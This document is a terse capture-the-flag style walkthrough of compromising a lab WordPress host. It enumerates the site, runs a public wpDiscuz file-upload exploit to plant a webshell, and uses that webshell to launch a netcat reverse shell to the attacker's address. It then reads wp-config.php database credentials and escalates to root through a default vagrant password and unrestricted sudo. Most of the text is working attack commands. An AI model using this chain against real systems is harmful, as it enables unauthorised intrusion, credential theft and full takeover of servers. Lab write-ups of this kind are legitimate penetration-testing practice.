nmap shows ports 22 and 80 open
gobuster on port 80 shows /assets /js /css 
looking in /assets, it is indexing the files in it. one of the dirs in there are /fonts
In /fonts, we see /blog
Upon visiting /blog, we are redirected to a wordpress site
http://blogger.pg/assets/fonts/blog/?p=29
```zsh
wpscan --url http://192.168.105.217/assets/fonts/blog --enumerate p
#not much
wpscan --url http://192.168.105.217/assets/fonts/blog --enumerate p --plugins-detection aggressive
#gives 2 outdated plugins, one of which has exact-version rce
searchsploit wpDiscuz
searchsploit -m php/webapps/49967.py

#after some struggle to understand the exploit,
python 49967.py -u http://blogger.pg/assets/fonts/blog -p /?p=29
#This generates a webshell with a random name. we visit it, and ?cmd= for rce

http://blogger.pg/assets/fonts/blog/wp-content/uploads/2026/04/nywbavatvlykvgb-1776687924.2619.php?cmd=busybox+nc+192.168.45.240+80+-e+/bin/bash
```
www-data!

---
```zsh
cat /etc/passwd | grep sh$
#shows james and vagrant
cat wp-config.php
#shows a mariaDB creds for a wordpress database, which has James's password encrypted. But wasnt able to crack it reasonably soon

su vagrant : vagrant
#gives access to vagrant
sudo -l
#has all commands root
sudo -i
#root!
```